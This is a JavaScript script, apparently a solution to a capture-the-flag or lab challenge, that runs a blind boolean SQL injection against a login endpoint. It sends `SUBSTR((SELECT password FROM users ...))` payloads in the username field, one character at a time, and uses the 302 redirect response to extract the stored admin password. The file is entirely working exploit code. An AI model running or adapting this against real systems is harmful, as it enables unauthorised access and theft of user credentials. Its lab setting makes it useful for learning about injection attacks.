const axios = require("axios");

function getAllHexCodes() {
  const hexCodes = ["{", "}"].map((c) => c.charCodeAt(0).toString(16));
  for (let i = 97; i <= 122; i++) {
    hexCodes.push(i.toString(16));
  }
  for (let i = 65; i <= 90; i++) {
    hexCodes.push(i.toString(16));
  }
  for (let i = 48; i <= 57; i++) {
    hexCodes.push(i.toString(16));
  }
  return hexCodes;
}

async function requestChar(query) {
  const url = "http://10.10.61.84:5000/challenge3/login";
  try {
    const { status } = await axios.post(url, {
      username: query,
      password: "admin",
    }, {
      maxRedirects: 0,
      headers: {
        'Content-Type': 'application/x-www-form-urlencoded'
      }
    });
    return false;
  } catch (error) {
    return error.response.status === 302;
  }
}

async function attack() {
  const password_len = 38;
  const hexCodes = getAllHexCodes();
  const passwordChars = [];
  const promises = [];
  for (let i = 0; i <= password_len; i++) {
    for (let j = 0; j < hexCodes.length; j++) {
      const code = hexCodes[j];
      const query = `admin' AND SUBSTR((SELECT password FROM users LIMIT 0,1),${i + 1},1) = CAST(X'${code}' as Text)-- -`;
      promises.push(requestChar(query).then((result) => {
        if (result) {
          const char = String.fromCharCode(parseInt(code, 16));
          passwordChars[i] = char;
          console.log('Found', i, 'char:', char);
        }
      }))
    }
  }
  await Promise.all(promises);
  console.log('Password:', passwordChars.join(''));
}

attack();
